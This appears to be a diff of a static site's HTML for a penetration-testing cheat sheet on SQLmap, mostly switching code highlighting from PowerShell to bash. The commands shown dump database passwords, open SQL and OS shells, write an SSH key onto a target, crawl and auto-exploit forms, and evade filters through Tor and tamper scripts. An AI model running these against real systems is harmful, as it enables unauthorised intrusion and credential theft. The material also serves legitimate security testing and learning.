@@ -16,7 +16,7 @@
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.049d4847a3aa1cf53d39e61af77abeb9ec59a646f1c2966b651eb9ac73e137b9.js" integrity="sha256-BJ1IR6OqHPU9OeYa93q&#43;uexZpkbxwpZrZR65rHPhN7k=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.42c24b49fa2bd9a7bdb11c30a43d00df4dab358db93fecefd18b800583cb7f3f.js" integrity="sha256-QsJLSfor2ae9sRwwpD0A302rNY25P&#43;zv0YuABYPLfz8=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -1279,29 +1279,29 @@ Simple characters</p>
   Basic arguments for SQLmap
   <a class="anchor" href="#basic-arguments-for-sqlmap">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap --url=<span style="color:#e6db74">&#34;&lt;url&gt;&#34;</span> -p username --user-agent=SQLMAP --random-agent --threads=<span style="color:#ae81ff">10</span> --risk=<span style="color:#ae81ff">3</span> --level=<span style="color:#ae81ff">5</span> --eta --dbms=MySQL --os=Linux --banner -<span style="color:#f92672">-is</span>-dba --users --passwords --current-user --dbs
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap --url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;url&gt;&#34;</span> -p username --user-agent<span style="color:#f92672">=</span>SQLMAP --random-agent --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --eta --dbms<span style="color:#f92672">=</span>MySQL --os<span style="color:#f92672">=</span>Linux --banner --is-dba --users --passwords --current-user --dbs
 </span></span></code></pre></div><h3 id="load-a-request-file-and-use-mobile-user-agent">
   Load a request file and use mobile user-agent
   <a class="anchor" href="#load-a-request-file-and-use-mobile-user-agent">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -r sqli.req --safe-url=http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>/ --mobile --safe-freq=<span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r sqli.req --safe-url<span style="color:#f92672">=</span>http://10.10.10.10/ --mobile --safe-freq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><h3 id="custom-injection-in-useragentheaderreferercookie">
   Custom injection in UserAgent/Header/Referer/Cookie
   <a class="anchor" href="#custom-injection-in-useragentheaderreferercookie">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com&#34;</span> --data <span style="color:#e6db74">&#34;username=admin&amp;password=pass&#34;</span>  --headers=<span style="color:#e6db74">&#34;x-forwarded-for:127.0.0.1*&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com&#34;</span> --data <span style="color:#e6db74">&#34;username=admin&amp;password=pass&#34;</span>  --headers<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x-forwarded-for:127.0.0.1*&#34;</span>
 </span></span><span style="display:flex;"><span>The injection is located at the <span style="color:#e6db74">&#39;*&#39;</span>
 </span></span></code></pre></div><h3 id="second-order-injection">
   Second order injection
   <a class="anchor" href="#second-order-injection">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order <span style="color:#e6db74">&#34;http://targetapp/wishlist&#34;</span> -v <span style="color:#ae81ff">3</span>
-</span></span><span style="display:flex;"><span>sqlmap -r <span style="color:#ae81ff">1</span>.txt -dbms MySQL -second-order <span style="color:#e6db74">&#34;http://&lt;IP/domain&gt;/joomla/administrator/index.php&#34;</span> -D <span style="color:#e6db74">&#34;joomla&#34;</span> -dbs
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order <span style="color:#e6db74">&#34;http://targetapp/wishlist&#34;</span> -v <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>sqlmap -r 1.txt -dbms MySQL -second-order <span style="color:#e6db74">&#34;http://&lt;IP/domain&gt;/joomla/administrator/index.php&#34;</span> -D <span style="color:#e6db74">&#34;joomla&#34;</span> -dbs
 </span></span></code></pre></div><h3 id="shell">
   Shell
   <a class="anchor" href="#shell">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>SQL Shell
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SQL Shell
 </span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --sql-shell
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Simple Shell
@@ -1311,107 +1311,107 @@ Simple characters</p>
 </span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --os-pwn
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>SSH Shell by dropping an SSH key
-</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span> -p id -<span style="color:#f92672">-file</span>-write=/root/.ssh/id_rsa.pub -<span style="color:#f92672">-file</span>-destination=/home/user/.ssh/
+</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span> -p id --file-write<span style="color:#f92672">=</span>/root/.ssh/id_rsa.pub --file-destination<span style="color:#f92672">=</span>/home/user/.ssh/
 </span></span></code></pre></div><h3 id="crawl-a-website-with-sqlmap-and-auto-exploit">
   Crawl a website with SQLmap and auto-exploit
   <a class="anchor" href="#crawl-a-website-with-sqlmap-and-auto-exploit">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://example.com/&#34;</span> --crawl=<span style="color:#ae81ff">1</span> --random-agent --batch --forms --threads=<span style="color:#ae81ff">5</span> --level=<span style="color:#ae81ff">5</span> --risk=<span style="color:#ae81ff">3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://example.com/&#34;</span> --crawl<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --random-agent --batch --forms --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the <span style="color:#66d9ef">default</span> answers
-</span></span><span style="display:flex;"><span>--crawl = how deep you want to crawl a site
-</span></span><span style="display:flex;"><span>--forms = Parse and test forms
+</span></span><span style="display:flex;"><span>--batch <span style="color:#f92672">=</span> non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+</span></span><span style="display:flex;"><span>--crawl <span style="color:#f92672">=</span> how deep you want to crawl a site
+</span></span><span style="display:flex;"><span>--forms <span style="color:#f92672">=</span> Parse and test forms
 </span></span></code></pre></div><h3 id="using-tor-with-sqlmap">
   Using TOR with SQLmap
   <a class="anchor" href="#using-tor-with-sqlmap">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://www.target.com&#34;</span> --tor --tor-type=SOCKS5 --time-sec <span style="color:#ae81ff">11</span> --check-tor --level=<span style="color:#ae81ff">5</span> --risk=<span style="color:#ae81ff">3</span> --threads=<span style="color:#ae81ff">5</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://www.target.com&#34;</span> --tor --tor-type<span style="color:#f92672">=</span>SOCKS5 --time-sec <span style="color:#ae81ff">11</span> --check-tor --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
 </span></span></code></pre></div><h3 id="using-a-proxy-with-sqlmap">
   Using a proxy with SQLmap
   <a class="anchor" href="#using-a-proxy-with-sqlmap">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://www.target.com&#34;</span> --proxy=<span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://www.target.com&#34;</span> --proxy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>
 </span></span></code></pre></div><h3 id="using-chrome-cookie-and-a-proxy">
   Using Chrome cookie and a Proxy
   <a class="anchor" href="#using-chrome-cookie-and-a-proxy">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;https://test.com/index.php?id=99&#34;</span> --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy <span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>  <span style="color:#f92672">-f</span>  --time-sec <span style="color:#ae81ff">15</span> --level <span style="color:#ae81ff">3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;https://test.com/index.php?id=99&#34;</span> --load-cookie<span style="color:#f92672">=</span>/media/truecrypt1/TI/cookie.txt --proxy <span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>  -f  --time-sec <span style="color:#ae81ff">15</span> --level <span style="color:#ae81ff">3</span>
 </span></span></code></pre></div><h3 id="using-suffix-to-tamper-the-injection">
   Using suffix to tamper the injection
   <a class="anchor" href="#using-suffix-to-tamper-the-injection">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --suffix=<span style="color:#e6db74">&#34;-- &#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --suffix<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-- &#34;</span>
 </span></span></code></pre></div><h3 id="general-tamper-option-and-tampers-list">
   General tamper option and tamper&rsquo;s list
   <a class="anchor" href="#general-tamper-option-and-tampers-list">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>tamper=name_of_the_tamper
-</span></span></code></pre></div><pre tabindex="0"><code>| Tamper | Description |
-| ------------- | ------------- |
-| 0x2char.py | Replaces each (MySQL) 0x&lt;hex&gt; encoded string with equivalent CONCAT(CHAR(),…) counterpart |
-| apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
-| apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart |
-| appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
-| base64encode.py | Base64 all characters in a given payload  |
-| between.py | Replaces greater than operator (&#39;&gt;&#39;) with &#39;NOT BETWEEN 0 AND #&#39; |
-| bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
-| chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
-| charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54) |
-| charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054) |
-| charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; \u0053\u0045\u004C\u0045\u0043\u0054) |
-| commalesslimit.py | Replaces instances like &#39;LIMIT M, N&#39; with &#39;LIMIT N OFFSET M&#39; |
-| commalessmid.py | Replaces instances like &#39;MID(A, B, C)&#39; with &#39;MID(A FROM B FOR C)&#39; |
-| commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/() |
-| concat2concatws.py | Replaces instances like &#39;CONCAT(A, B)&#39; with &#39;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#39; |
-| charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
-| charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
-| equaltolike.py | Replaces all occurrences of operator equal (&#39;=&#39;) with operator &#39;LIKE&#39;  |
-| escapequotes.py | Slash escape quotes (&#39; and &#34;) |
-| greatest.py | Replaces greater than operator (&#39;&gt;&#39;) with &#39;GREATEST&#39; counterpart |
-| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
-| htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -&gt; &amp;#39;) |
-| ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart | 
-| ifnull2ifisnull.py | Replaces instances like &#39;IFNULL(A, B)&#39; with &#39;IF(ISNULL(A), B, A)&#39; |
-| informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
-| least.py | Replaces greater than operator (‘&gt;’) with ‘LEAST’ counterpart |
-| lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -&gt; select) |
-| modsecurityversioned.py | Embraces complete query with versioned comment |
-| modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
-| multiplespaces.py | Adds multiple spaces around SQL keywords |
-| nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(&#34;SELECT&#34;, &#34;&#34;)) filters|
-| overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
-| overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
-| percentage.py | Adds a percentage sign (&#39;%&#39;) infront of each character  |
-| plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
-| plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
-| randomcase.py | Replaces each keyword character with random case value |
-| randomcomments.py | Add random comments to SQL keywords |
-| securesphere.py | Appends special crafted string |
-| sp_password.py |  Appends &#39;sp_password&#39; to the end of the payload for automatic obfuscation from DBMS logs |
-| space2comment.py | Replaces space character (&#39; &#39;) with comments |
-| space2dash.py | Replaces space character (&#39; &#39;) with a dash comment (&#39;--&#39;) followed by a random string and a new line (&#39;\n&#39;) |
-| space2hash.py | Replaces space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a random string and a new line (&#39;\n&#39;) |
-| space2morehash.py | Replaces space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a random string and a new line (&#39;\n&#39;) |
-| space2mssqlblank.py | Replaces space character (&#39; &#39;) with a random blank character from a valid set of alternate characters |
-| space2mssqlhash.py | Replaces space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a new line (&#39;\n&#39;) |
-| space2mysqlblank.py | Replaces space character (&#39; &#39;) with a random blank character from a valid set of alternate characters |
-| space2mysqldash.py | Replaces space character (&#39; &#39;) with a dash comment (&#39;--&#39;) followed by a new line (&#39;\n&#39;) |
-| space2plus.py |  Replaces space character (&#39; &#39;) with plus (&#39;+&#39;)  |
-| space2randomblank.py | Replaces space character (&#39; &#39;) with a random blank character from a valid set of alternate characters |
-| symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||) |
-| unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
-| unmagicquotes.py | Replaces quote character (&#39;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
-| uppercase.py | Replaces each keyword character with upper case value &#39;INSERT&#39;|
-| varnish.py | Append a HTTP header &#39;X-originating-IP&#39; |
-| versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
-| versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
-| xforwardedfor.py | Append a fake HTTP header &#39;X-Forwarded-For&#39; |
-</code></pre><h3 id="sqlmap-without-sql-injection">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tamper<span style="color:#f92672">=</span>name_of_the_tamper
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>| Tamper | Description |
+</span></span><span style="display:flex;"><span>| ------------- | ------------- |
+</span></span><span style="display:flex;"><span>| 0x2char.py | Replaces each <span style="color:#f92672">(</span>MySQL<span style="color:#f92672">)</span> 0x&lt;hex&gt; encoded string with equivalent CONCAT<span style="color:#f92672">(</span>CHAR<span style="color:#f92672">()</span>,…<span style="color:#f92672">)</span> counterpart |
+</span></span><span style="display:flex;"><span>| apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
+</span></span><span style="display:flex;"><span>| apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart |
+</span></span><span style="display:flex;"><span>| appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
+</span></span><span style="display:flex;"><span>| base64encode.py | Base64 all characters in a given payload  |
+</span></span><span style="display:flex;"><span>| between.py | Replaces greater than operator <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&gt;&#39;</span><span style="color:#f92672">)</span> with <span style="color:#e6db74">&#39;NOT BETWEEN 0 AND #&#39;</span> |
+</span></span><span style="display:flex;"><span>| bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character <span style="color:#f92672">=</span> with LIKE operator  |
+</span></span><span style="display:flex;"><span>| chardoubleencode.py | Double url-encodes all characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| charencode.py | URL-encodes all characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>e.g. SELECT -&gt; %53%45%4C%45%43%54<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| charunicodeencode.py | Unicode-URL-encodes all characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>e.g. SELECT -&gt; <span style="color:#ae81ff">\u</span>0053<span style="color:#ae81ff">\u</span>0045<span style="color:#ae81ff">\u</span>004C<span style="color:#ae81ff">\u</span>0045<span style="color:#ae81ff">\u</span>0043<span style="color:#ae81ff">\u</span>0054<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| commalesslimit.py | Replaces instances like <span style="color:#e6db74">&#39;LIMIT M, N&#39;</span> with <span style="color:#e6db74">&#39;LIMIT N OFFSET M&#39;</span> |
+</span></span><span style="display:flex;"><span>| commalessmid.py | Replaces instances like <span style="color:#e6db74">&#39;MID(A, B, C)&#39;</span> with <span style="color:#e6db74">&#39;MID(A FROM B FOR C)&#39;</span> |
+</span></span><span style="display:flex;"><span>| commentbeforeparentheses.py | Prepends <span style="color:#f92672">(</span>inline<span style="color:#f92672">)</span> comment before parentheses <span style="color:#f92672">(</span>e.g. <span style="color:#f92672">(</span> -&gt; /**/<span style="color:#f92672">()</span> |
+</span></span><span style="display:flex;"><span>| concat2concatws.py | Replaces instances like <span style="color:#e6db74">&#39;CONCAT(A, B)&#39;</span> with <span style="color:#e6db74">&#39;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#39;</span> |
+</span></span><span style="display:flex;"><span>| charencode.py | Url-encodes all characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span>  |
+</span></span><span style="display:flex;"><span>| charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span>  |
+</span></span><span style="display:flex;"><span>| equaltolike.py | Replaces all occurrences of operator equal <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#f92672">)</span> with operator <span style="color:#e6db74">&#39;LIKE&#39;</span>  |
+</span></span><span style="display:flex;"><span>| escapequotes.py | Slash escape quotes <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; and &#34;) |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| greatest.py | Replaces greater than operator (&#39;</span>&gt;<span style="color:#e6db74">&#39;) with &#39;</span>GREATEST<span style="color:#e6db74">&#39; counterpart |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -&gt; &amp;#39;) |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart | 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ifnull2ifisnull.py | Replaces instances like &#39;</span>IFNULL<span style="color:#f92672">(</span>A, B<span style="color:#f92672">)</span><span style="color:#e6db74">&#39; with &#39;</span>IF<span style="color:#f92672">(</span>ISNULL<span style="color:#f92672">(</span>A<span style="color:#f92672">)</span>, B, A<span style="color:#f92672">)</span><span style="color:#e6db74">&#39; |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| least.py | Replaces greater than operator (‘&gt;’) with ‘LEAST’ counterpart |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -&gt; select) |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| modsecurityversioned.py | Embraces complete query with versioned comment |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| multiplespaces.py | Adds multiple spaces around SQL keywords |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(&#34;SELECT&#34;, &#34;&#34;)) filters|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| percentage.py | Adds a percentage sign (&#39;</span>%<span style="color:#e6db74">&#39;) infront of each character  |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| randomcase.py | Replaces each keyword character with random case value |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| randomcomments.py | Add random comments to SQL keywords |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| securesphere.py | Appends special crafted string |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| sp_password.py |  Appends &#39;</span>sp_password<span style="color:#e6db74">&#39; to the end of the payload for automatic obfuscation from DBMS logs |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| space2comment.py | Replaces space character (&#39;</span> <span style="color:#e6db74">&#39;) with comments |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| space2dash.py | Replaces space character (&#39;</span> <span style="color:#e6db74">&#39;) with a dash comment (&#39;</span>--<span style="color:#e6db74">&#39;) followed by a random string and a new line (&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;) |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| space2hash.py | Replaces space character (&#39;</span> <span style="color:#e6db74">&#39;) with a pound character (&#39;</span><span style="color:#75715e">#&#39;) followed by a random string and a new line (&#39;\n&#39;) |</span>
+</span></span><span style="display:flex;"><span>| space2morehash.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a pound character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">)</span> followed by a random string and a new line <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\n&#39;</span><span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| space2mssqlblank.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a random blank character from a valid set of alternate characters |
